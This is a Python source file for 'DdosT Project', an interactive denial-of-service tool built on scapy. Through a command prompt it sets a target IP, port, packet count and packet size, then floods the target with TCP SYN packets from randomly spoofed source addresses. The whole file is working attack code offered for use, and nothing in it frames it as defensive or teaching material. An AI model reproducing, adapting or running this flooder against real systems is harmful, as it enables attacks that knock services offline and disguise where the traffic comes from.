from random import randint
from os import system
import os
import subprocess
from scapy.layers.inet import TCP, IP
from scapy.packet import Raw
from scapy.sendrecv import send


class DdosT:
    def __init__(self):
        self.__get_intro()
        self.attacks = self.DdosAttacks()

    @staticmethod
    def __get_intro():
        try:
            subprocess.run(["figlet", "-v"], stdout=subprocess.DEVNULL)
        except Exception:
            try:
                system("apt-get install figlet")
            except Exception:
                print("figlet module not found")
                exit()
        system("clear")
        print("\033[1;31m")
        subprocess.run(["figlet", "-t", "-c", "-k", "DdosT Project"])
        print("")
        print("\033[1;37m\tMustafa Cuneyt Kafes\n".center(int(os.get_terminal_size()[0])))
        print(
            "\033[1;32mIf you want to get more information about the program:\n"
            "\033[1;37mYou can contact me via Discord: Livcon#9961\n")
        print("\033[0m")

    class DdosAttacks:
        def __init__(self, target_ip=None, target_port=None):
            self.RHOST = target_ip
            self.RPORT = target_port
            self.count = 1
            self.p_size = None
            self.__choose_attack()

        def __choose_attack(self):
            while True:
                print("\033[1;37mAttack Types:\n\033[0m"
                      "[1] - SynFlood\n")
                print("Please choose your DDoS Attack type")
                user_choice = input("DdosT | $ ")
                try:
                    user_choice = int(user_choice)
                except Exception:
                    print("\033[1;31mPlease enter a valid value\033[0m\n")
                    continue
                if user_choice == 1:
                    print("\033[1;32mAttack type selected as SynFlood\033[0m\n")
                    terminal_result = self.__terminal()
                    if not terminal_result:
                        continue
                    attack_result = self.syn_flood(self.count, self.p_size)
                    if not attack_result:
                        return
                    else:
                        continue
                else:
                    print("\033[1;31mPlease enter a valid value\033[0m\n")

        def __terminal(self):
            def get_help():
                print("asd")

            while True:
                command = input("DdosT | $ ")
                if command == "options":
                    info = {1: ["RHOST", str(self.RHOST), "Target IP Address"],
                            2: ["RPORT", str(self.RPORT), "Target Port Number"],
                            3: ["COUNT", str(self.count), "Number of Packets"],
                            4: ["SIZE", str(self.p_size), "Size of Packets"]}

                    # Print the names of the columns.
                    print("\n\033[1;37m{:<15} {:<15} {:<15}\n\033[0m".format('ATTR', 'VALUE', 'DESC'))

                    # print each data item.
                    for key, value in info.items():
                        attr, val, desc = value
                        print("{:<15} {:<15} {:<15}".format(attr, val, desc))
                    print("")
                elif command == "help":
                    get_help()
                elif command == "execute":
                    return True
                elif command == "types":
                    print("")
                    return False
                elif command.split(" ")[0] == "set":
                    if command.split(" ")[1].lower() == "rhost":
                        try:
                            self.RHOST = command.split(" ")[2]
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    elif command.split(" ")[1].lower() == "rport":
                        try:
                            new_port = int(command.split(" ")[2])
                            if 0 <= new_port <= 65535:
                                self.RPORT = new_port
                            else:
                                print("\033[1;31mPlease enter a valid value\033[0m\n")
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    elif command.split(" ")[1].lower() == "count":
                        try:
                            new_count = int(command.split(" ")[2])
                            if 0 < new_count < 999999:
                                self.count = new_count
                            else:
                                print("\033[1;31mPlease enter a valid value\033[0m\n")
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    elif command.split(" ")[1].lower() == "size" or command.split(" ")[1].upper() == "SIZE":
                        try:
                            new_size = int(command.split(" ")[2])
                            if 0 < new_size < 1000:
                                self.p_size = new_size
                            else:
                                print("\033[1;31mPlease enter a valid value\033[0m\n")
                        except Exception:
                            print("\033[1;31mPlease enter a valid value\033[0m\n")
                    else:
                        get_help()
                else:
                    get_help()

        def set_target_info(self, target_ip, target_port):
            self.RHOST = target_ip
            self.RPORT = target_port

        # fake ip generator
        def generate_ip(self):
            ip = ".".join(map(str, (randint(0, 255) for i in range(4))))
            return ip

        def syn_flood(self, count, size):
            total_sent = 0
            total_bytes = 0
            system("clear")
            for i in range(0, count):
                LHOST = self.generate_ip()
                LPORT = randint(1000, 9000)
                ip = IP(src=LHOST, dst=self.RHOST)
                tcp = TCP(sport=LPORT, dport=self.RPORT, flags="S", seq=randint(1000, 9000),
                          window=randint(1000, 9000))
                if size is not None:
                    raw = Raw(b"X" * size)
                    bytes = 8 * size
                    total_bytes += bytes
                    send(ip / tcp / raw, verbose=0)
                else:
                    rand_size = randint(1, 7)
                    raw = Raw(b"X" * rand_size)
                    bytes = 8 * rand_size
                    total_bytes += bytes
                    send(ip / tcp, verbose=0)
                print("SYN Request packet sent ({} bytes)".format(bytes))
                total_sent += 1
            print("\n\033[1;32mTotal of {} request packages in {} bytes sent\033[0m\n".format(total_sent, total_bytes))
            while True:
                usr_choice = input("Would you like to continue ? (Y/n) : ")
                print("")
                if usr_choice == "" or usr_choice.lower() == "y":
                    return True
                elif usr_choice.lower() == "n":
                    return False
                else:
                    continue


ddos = DdosT()
